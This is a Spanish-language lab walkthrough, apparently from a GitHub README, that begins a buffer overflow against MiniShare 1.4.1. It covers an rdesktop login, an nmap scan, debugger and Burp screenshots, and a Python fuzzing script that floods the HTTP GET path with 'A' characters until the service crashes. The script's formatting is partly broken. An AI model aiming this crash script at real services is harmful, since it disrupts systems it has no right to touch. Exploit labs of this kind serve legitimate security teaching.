# BUFFEROVERFLOW-MINISHARE-1.4.1
***
Se procedera a realizar un desdoblamiento de buffer con el software MINISHARE 1.4.1 habrimos una ventana emergente al lado de nuestro tilix para poder trabajar, usamos el siguiente comando, colacando la IP de la maquina vulnerable.
***
``` 
rdesktop " IP 192.168.a.b"  -u user -p paswword
```
****
### Screenshot
![inicio](https://user-images.githubusercontent.com/104048850/180593311-1796279a-4a4f-4ee8-8fae-baa47898a6e4.png)
Procedemos a realizar un escaneo de vulnerabilidades 
``` 
nmap 192.168.72.135 -sV

```
***
Podemos observar los puertos de la maquina vulnerable sin ejecutar el programa 
***
### Screenshot
![nmap](https://user-images.githubusercontent.com/104048850/180593535-955c4085-6369-4afb-b5e7-dd56e463c24f.png)
***
Ahora realizaremos el escaneo ejecutando el programa minishare usando la herramiento immunity debugger
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180593763-736524cd-0f76-4ce6-9894-0780023678ad.png)

Para ver que comando vamos a usar, utilizaremos burpsuite y un proxy 
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180593888-219158db-ad4b-454e-a6e5-2aa429d6c417.png)
***
Ahora  ejecutamos el siguinte script  para ver la capacidad del buffer 
1 #!/usr/bin/python3.8

2 #! This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

 3 !# Part 1 of proof of concept by Vry4n
 ***
!# This script is intended to discover the size of the buffer
***
import socket
***
!FUZZ = ""
***
!# While true increase the variable FUZZ by adding 100 "A" until the program crashes
!while True:
    FUZZ += "A" * 100
    print("Fuzzing with {} bytes".format(len(FUZZ)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(("192.168.a,b", 80))
    # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
    s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
    s.recv(1024)
    s.close()
